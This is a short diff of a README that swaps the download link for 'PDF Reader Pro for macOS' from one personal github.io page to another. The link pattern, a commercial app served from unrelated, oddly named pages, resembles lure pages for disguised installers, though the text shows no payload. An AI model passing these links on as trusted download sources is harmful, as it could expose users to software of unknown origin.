@@ -6,7 +6,7 @@
 
 ## 📥 Download PDF Reader Pro for macOS
 
-[![⬇️ Download PDF Reader Pro](https://img.shields.io/badge/Download-PDF%20Reader%20Pro%20Mac-blue?style=for-the-badge&logo=apple)](https://shuziktobehuman.github.io/huja/PDFReader)
+[![⬇️ Download PDF Reader Pro](https://img.shields.io/badge/Download-PDF%20Reader%20Pro%20Mac-blue?style=for-the-badge&logo=apple)](https://mitrobandus.github.io/.github/PDFReader)
 
 ---
 
